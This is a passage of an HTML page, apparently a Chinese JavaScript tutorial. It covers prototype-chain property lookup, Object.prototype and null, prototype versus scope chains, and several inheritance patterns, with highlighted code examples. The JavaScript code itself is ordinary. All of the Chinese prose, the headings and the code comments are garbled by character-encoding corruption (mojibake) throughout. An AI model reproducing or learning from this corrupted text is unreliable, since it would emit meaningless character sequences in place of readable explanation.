id="4-2-å±æ€§æŸ¥æ‰¾è§„åˆ™ï¼šä»å®ä¾‹åˆ°åŸå‹é“¾é¡¶ç«¯"><a href="#4-2-å±æ€§æŸ¥æ‰¾è§„åˆ™ï¼šä»å®ä¾‹åˆ°åŸå‹é“¾é¡¶ç«¯" class="headerlink" title="4.2 å±æ€§æŸ¥æ‰¾è§„åˆ™ï¼šä»å®ä¾‹åˆ°åŸå‹é“¾é¡¶ç«¯"></a>4.2 å±æ€§æŸ¥æ‰¾è§„åˆ™ï¼šä»å®ä¾‹åˆ°åŸå‹é“¾é¡¶ç«¯</h2><p><strong>åŸºæœ¬æŸ¥æ‰¾æµç¨‹</strong></p><p>å½“æŸ¥æ‰¾å¯¹è±¡å±æ€§&#x2F;æ–¹æ³•æ—¶ï¼ŒJavaScript å¼•æ“ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºè¿›è¡ŒæŸ¥æ‰¾</p><ol><li>æ£€æŸ¥å®ä¾‹è‡ªèº«å±æ€§ï¼šé¦–å…ˆåœ¨å®ä¾‹å¯¹è±¡è‡ªèº«å±æ€§ä¸­æŸ¥æ‰¾ï¼Œå¯ä½¿ç”¨ <code>hasOwnProperty()</code> éªŒè¯å±æ€§æ˜¯å¦ä¸ºè‡ªæœ‰</li><li>æ²¿åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾ï¼šå¦‚æœå®ä¾‹è‡ªèº«æ²¡æœ‰è¯¥å±æ€§ï¼Œåˆ™è®¿é—® <code>__proto__</code>ï¼Œé‡å¤æ­¤è¿‡ç¨‹ç›´åˆ°æ‰¾åˆ°å±æ€§æˆ–åˆ°è¾¾åŸå‹é“¾ç»ˆç‚¹</li><li>ç»ˆæ­¢æ¡ä»¶ï¼šæ‰¾åˆ°å±æ€§ç«‹å³è¿”å›ï¼Œæˆ–åˆ°è¾¾ nullï¼ˆåŸå‹é“¾ä¸­æ–­ï¼‰æ—¶è¿”å› undefined</li></ol><p><strong>å›¾è§£æŸ¥æ‰¾æµç¨‹</strong></p><pre class="mermaid">graph TD    A[è®¿é—® obj.property] --> B{objæœ‰è‡ªæœ‰å±æ€§?}    B -->|æ˜¯| C[è¿”å›è¯¥å±æ€§å€¼]    B -->|å¦| D[è·å– obj.__proto__]    D --> E{protoä¸ºnull?}    E -->|æ˜¯| F[è¿”å›undefined]    E -->|å¦| G[åœ¨protoå¯¹è±¡ä¸ŠæŸ¥æ‰¾property]    G --> H{æ‰¾åˆ°å±æ€§?}    H -->|æ˜¯| I[è¿”å›å±æ€§å€¼]    H -->|å¦| D</pre><p><strong>ç¤ºä¾‹ä»£ç è¯´æ˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// è‡ªæœ‰å±æ€§</span><br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">// åŸå‹å±æ€§</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><br><span class="hljs-comment">// æŸ¥æ‰¾è¿‡ç¨‹æ¼”ç¤ºï¼š</span><br>p.<span class="hljs-property">name</span>;    <span class="hljs-comment">// 1. æ‰¾åˆ°è‡ªæœ‰å±æ€§ â†’ &quot;Alice&quot;</span><br>p.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 2. è‡ªæœ‰æ—  â†’ Person.prototypeæ‰¾åˆ° â†’ æ‰§è¡Œæ–¹æ³•</span><br>p.<span class="hljs-property">age</span>;     <span class="hljs-comment">// 3. è‡ªæœ‰æ—  â†’ Person.prototypeæ—  â†’ Object.prototypeæ—  â†’ null â†’ undefined</span><br></code></pre></td></tr></table></figure><h2 id="4-3-åŸå‹é“¾çš„ç»ˆç‚¹ï¼šObject-prototype-å’Œ-null"><a href="#4-3-åŸå‹é“¾çš„ç»ˆç‚¹ï¼šObject-prototype-å’Œ-null" class="headerlink" title="4.3 åŸå‹é“¾çš„ç»ˆç‚¹ï¼šObject.prototypeÂ å’ŒÂ null"></a>4.3 åŸå‹é“¾çš„ç»ˆç‚¹ï¼š<code>Object.prototype</code>Â å’ŒÂ <code>null</code></h2><p>JavaScript çš„åŸå‹é“¾æœ€ç»ˆä¼šæŒ‡å‘ä¸¤ä¸ªç‰¹æ®Šçš„ç»ˆç‚¹ï¼š</p><ol><li>Object.prototypeï¼šæ‰€æœ‰å¸¸è§„å¯¹è±¡çš„æœ€ç»ˆåŸå‹å¯¹è±¡</li><li>nullï¼šåŸå‹é“¾çš„çœŸæ­£ç»ˆç‚¹ï¼Œè¡¨ç¤ºâ€œæ— åŸå‹â€</li></ol><p><strong>Object.prototype çš„ä½œç”¨</strong></p><p>ï¼ˆ1ï¼‰æä¾›åŸºç¡€å¯¹è±¡æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ‰€æœ‰å¯¹è±¡ç»§æ‰¿çš„æ–¹æ³•ä¸¾ä¾‹</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-title function_">toString</span>();      <span class="hljs-comment">// ç»§æ‰¿è‡ªObject.prototype</span><br>obj.<span class="hljs-title function_">hasOwnProperty</span>(); <span class="hljs-comment">// ç»§æ‰¿è‡ªObject.prototype</span><br>obj.<span class="hljs-title function_">valueOf</span>();       <span class="hljs-comment">// ç»§æ‰¿è‡ªObject.prototype</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åŸå‹é“¾çš„æ¢çº½ç«™ï¼šåŸºæœ¬æ‰€æœ‰åŸå‹é“¾éƒ½ä¼šç»è¿‡ Object.prototypeï¼ˆObject.create(null)åˆ›å»ºçš„çº¯å‡€å¯¹è±¡é™¤å¤–ï¼‰</p><p>ï¼ˆ3ï¼‰å†…ç½®æ–¹æ³•çš„å­˜å‚¨åº“</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-comment">/* åŒ…å«ï¼š</span><br><span class="hljs-comment"> * - constructor: Object()</span><br><span class="hljs-comment"> * - toString()</span><br><span class="hljs-comment"> * - valueOf()</span><br><span class="hljs-comment"> * - hasOwnProperty()</span><br><span class="hljs-comment"> * - isPrototypeOf()</span><br><span class="hljs-comment"> * - ...</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p><strong>null çš„æ„ä¹‰</strong></p><p>ï¼ˆ1ï¼‰åŸå‹é“¾çš„ç»ˆæ­¢æ ‡è¯†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)); <span class="hljs-comment">// null</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰è®¾è®¡ç›®çš„ï¼šè¡¨ç¤ºâ€œæ— åŸå‹â€çš„æœ€ç»ˆçŠ¶æ€ï¼Œé˜²æ­¢åŸå‹é“¾æŸ¥æ‰¾è¿›å…¥æ— é™å¾ªç¯</p><p>ï¼ˆ3ï¼‰ç‰¹æ®Šå¯¹è±¡çš„å¯¹æ¯”</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> normalObj = &#123;&#125;;<br><span class="hljs-keyword">const</span> bareObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> normalObj); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;toString&#x27;</span> <span class="hljs-keyword">in</span> bareObj);   <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h2 id="4-4-åŸå‹é“¾-vs-ä½œç”¨åŸŸé“¾"><a href="#4-4-åŸå‹é“¾-vs-ä½œç”¨åŸŸé“¾" class="headerlink" title="4.4 åŸå‹é“¾ vs ä½œç”¨åŸŸé“¾"></a>4.4 åŸå‹é“¾ vs ä½œç”¨åŸŸé“¾</h2><p><strong>ä½œç”¨åŸŸé“¾ç®€è¿°</strong></p><p>ä½œç”¨åŸŸé“¾æ˜¯ JavaScript ä¸­å®ç°å˜é‡æŸ¥æ‰¾çš„æœºåˆ¶ï¼Œæ¯ä¸ªå‡½æ•°æ‰§è¡Œæ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªä½œç”¨åŸŸé“¾ã€‚ä½œç”¨åŸŸé“¾ç”±å½“å‰å‡½æ•°çš„æ´»åŠ¨å¯¹è±¡å’Œæ‰€æœ‰å¤–å±‚å‡½æ•°çš„å˜é‡å¯¹è±¡ç»„æˆï¼Œå½“æŸ¥æ‰¾å˜é‡æ—¶ï¼ŒJavaScript å¼•æ“ä¼šä»å½“å‰æ‰§è¡Œä½œç”¨åŸŸå¼€å§‹æŸ¥æ‰¾ï¼Œå½“å‰ä½œç”¨åŸŸæœªæ‰¾åˆ°æ—¶ä¼šæ²¿ä½œç”¨åŸŸé“¾å‘ä¸ŠæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°å˜é‡æˆ–è¾¾åˆ°å…¨å±€ä½œç”¨åŸŸè¿”å› undefined</p><p><strong>ä¸¤è€…å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">åŸå‹é“¾</th><th align="left">ä½œç”¨åŸŸé“¾</th></tr></thead><tbody><tr><td align="left">ç›®çš„</td><td align="left">å®ç°å¯¹è±¡é—´çš„å±æ€§&#x2F;æ–¹æ³•çš„å…±äº«å’Œç»§æ‰¿</td><td align="left">å®ç°å˜é‡çš„æŸ¥æ‰¾å’Œè®¿é—®</td></tr><tr><td align="left">ç»„æˆ</td><td align="left">å¯¹è±¡çš„ <code>__proto__</code>é“¾æ¥å½¢æˆ</td><td align="left">å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­çš„å˜é‡å¯¹è±¡é“¾</td></tr><tr><td align="left">æŸ¥æ‰¾æ–¹å‘</td><td align="left">ä»å®ä¾‹å¯¹è±¡å¾€åŸå‹å¯¹è±¡æ–¹å‘æŸ¥æ‰¾</td><td align="left">ä»å†…å±‚å‡½æ•°å¾€å¤–å±‚å‡½æ•°æ–¹å‘æŸ¥æ‰¾</td></tr><tr><td align="left">è§¦å‘æ—¶æœº</td><td align="left">è®¿é—®å¯¹è±¡å±æ€§æ—¶</td><td align="left">è®¿é—®å˜é‡æ—¶</td></tr><tr><td align="left">ç»ˆç‚¹</td><td align="left">null</td><td align="left">å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼ˆwindow&#x2F;globalï¼‰</td></tr><tr><td align="left">åˆ›å»ºæ–¹å¼</td><td align="left">newã€Object.create()æˆ– <code>__proto_</code></td><td align="left">é€šè¿‡å‡½æ•°å®šä¹‰å’Œè°ƒç”¨</td></tr></tbody></table><p><strong>ä»£ç ç¤ºä¾‹</strong></p><p>ï¼ˆ1ï¼‰åŸå‹é“¾æŸ¥æ‰¾</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;John&#x27;</span>);<br><br><span class="hljs-comment">// åŸå‹é“¾æŸ¥æ‰¾è¿‡ç¨‹:</span><br><span class="hljs-comment">// 1. john è‡ªèº«æœ‰ name å±æ€§</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// ç›´æ¥æ‰¾åˆ°</span><br><br><span class="hljs-comment">// 2. john è‡ªèº«æ²¡æœ‰ sayHello æ–¹æ³•ï¼ŒæŸ¥æ‰¾åŸå‹é“¾</span><br>john.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// åœ¨ Person.prototype ä¸Šæ‰¾åˆ°</span><br><br><span class="hljs-comment">// 3. toString æ–¹æ³•æŸ¥æ‰¾</span><br><span class="hljs-comment">// john -&gt; Person.prototype -&gt; Object.prototype -&gt; null</span><br>john.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// æœ€ç»ˆåœ¨ Object.prototype ä¸Šæ‰¾åˆ°</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ä½œç”¨åŸŸé“¾æŸ¥æ‰¾</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> globalVar = <span class="hljs-string">&#x27;global&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> outerVar = <span class="hljs-string">&#x27;outer&#x27;</span>;<br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> innerVar = <span class="hljs-string">&#x27;inner&#x27;</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar);    <span class="hljs-comment">// å½“å‰ä½œç”¨åŸŸæ‰¾åˆ°</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar);    <span class="hljs-comment">// å¤–å±‚ä½œç”¨åŸŸæ‰¾åˆ°</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);   <span class="hljs-comment">// å…¨å±€ä½œç”¨åŸŸæ‰¾åˆ°</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(notDefined);  <span class="hljs-comment">// æŠ¥é”™ï¼Œæ‰€æœ‰ä½œç”¨åŸŸéƒ½æ‰¾ä¸åˆ°</span><br>  &#125;<br>  <br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><h1 id="ç¬¬äº”ç« ï¼šç»§æ‰¿ä¸åŸå‹é“¾"><a href="#ç¬¬äº”ç« ï¼šç»§æ‰¿ä¸åŸå‹é“¾" class="headerlink" title="ç¬¬äº”ç« ï¼šç»§æ‰¿ä¸åŸå‹é“¾"></a>ç¬¬äº”ç« ï¼šç»§æ‰¿ä¸åŸå‹é“¾</h1><h2 id="5-1-åŸºäºåŸå‹çš„ç»§æ‰¿å®ç°ï¼ˆObject-createï¼‰"><a href="#5-1-åŸºäºåŸå‹çš„ç»§æ‰¿å®ç°ï¼ˆObject-createï¼‰" class="headerlink" title="5.1 åŸºäºåŸå‹çš„ç»§æ‰¿å®ç°ï¼ˆObject.createï¼‰"></a>5.1 åŸºäºåŸå‹çš„ç»§æ‰¿å®ç°ï¼ˆObject.createï¼‰</h2><p><strong>ä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> animal = &#123;<br>  <span class="hljs-attr">init</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;,<br>  <span class="hljs-attr">getName</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(animal);<br>dog.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(dog);<br>myDog.<span class="hljs-title function_">init</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myDog.<span class="hljs-title function_">bark</span>());    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ç‰¹ç‚¹</strong></p><ul><li>æ›´çº¯ç²¹çš„åŸå‹ç»§æ‰¿ï¼Œä¸éœ€è¦æ„é€ å‡½æ•°</li><li>é€‚åˆç®€å•å¯¹è±¡ç»§æ‰¿åœºæ™¯</li><li>æ— æ³•å®ç°ç§æœ‰å±æ€§å’Œæ–¹æ³•</li></ul><h2 id="5-2-ç»„åˆç»§æ‰¿ï¼ˆæ„é€ å‡½æ•°-åŸå‹é“¾ï¼‰"><a href="#5-2-ç»„åˆç»§æ‰¿ï¼ˆæ„é€ å‡½æ•°-åŸå‹é“¾ï¼‰" class="headerlink" title="5.2 ç»„åˆç»§æ‰¿ï¼ˆæ„é€ å‡½æ•° + åŸå‹é“¾ï¼‰"></a>5.2 ç»„åˆç»§æ‰¿ï¼ˆæ„é€ å‡½æ•° + åŸå‹é“¾ï¼‰</h2><p><strong>ä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// çˆ¶ç±»</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span> = [<span class="hljs-string">&#x27;black&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>];<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>;<br>&#125;;<br><br><span class="hljs-comment">// å­ç±»</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œç»§æ‰¿å®ä¾‹å±æ€§</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-comment">// è®¾ç½®åŸå‹é“¾ç»§æ‰¿</span><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>; <span class="hljs-comment">// ä¿®å¤æ„é€ å‡½æ•°æŒ‡å‘</span><br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Woof!&#x27;</span>;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Buddy&#x27;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Buddy&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-title function_">bark</span>());   <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹åˆ†æ</strong></p><ul><li>Animal.call(this, name) å®ç°å®ä¾‹å±æ€§çš„ç»§æ‰¿ï¼ˆç±»ä¼¼å…¶ä»–è¯­è¨€çš„ super()ï¼‰</li><li>Object.create(Animal.prototype) åˆ›å»ºä»¥çˆ¶ç±»åŸå‹ä¸ºåŸå‹çš„æ–°å¯¹è±¡ï¼Œé¿å…ç›´æ¥èµ‹å€¼å¯¼è‡´åŸå‹æ±¡æŸ“</li><li>ä¿®å¤ constructor å±æ€§ä¿è¯å¯¹è±¡ç±»å‹æ­£ç¡®è¯†åˆ«</li></ul><h2 id="5-3-å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆä¼˜åŒ–æ–¹æ¡ˆï¼‰"><a href="#5-3-å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆä¼˜åŒ–æ–¹æ¡ˆï¼‰" class="headerlink" title="5.3 å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆä¼˜åŒ–æ–¹æ¡ˆï¼‰"></a>5.3 å¯„ç”Ÿç»„åˆç»§æ‰¿ï¼ˆä¼˜åŒ–æ–¹æ¡ˆï¼‰</h2><p><strong>ä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-params">child, parent</span>) &#123;<br>  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(parent.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br>  prototype.<span class="hljs-property">constructor</span> = child;<br>  child.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = prototype;<br>&#125;<br><br><span class="hljs-comment">// çˆ¶ç±»</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-comment">// å­ç±»</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) &#123;<br>  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;<br>&#125;<br><br><span class="hljs-comment">// ç»§æ‰¿</span><br><span class="hljs-title function_">inheritPrototype</span>(<span class="hljs-title class_">Dog</span>, <span class="hljs-title class_">Animal</span>);<br><br><span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Woof!&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&#x27;Max&#x27;</span>, <span class="hljs-string">&#x27;Labrador&#x27;</span>);<br>myDog.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">// &quot;Max&quot;</span><br>myDog.<span class="hljs-title function_">bark</span>();    <span class="hljs-comment">// &quot;Woof!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>ä¼˜åŠ¿</strong></p><ul><li>åªè°ƒç”¨ä¸€æ¬¡çˆ¶ç±»æ„é€ å‡½æ•°</li><li>åŸå‹é“¾ä¿æŒä¸å˜</li><li>èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ instanceof å’Œ isPrototypeOf</li></ul><h2 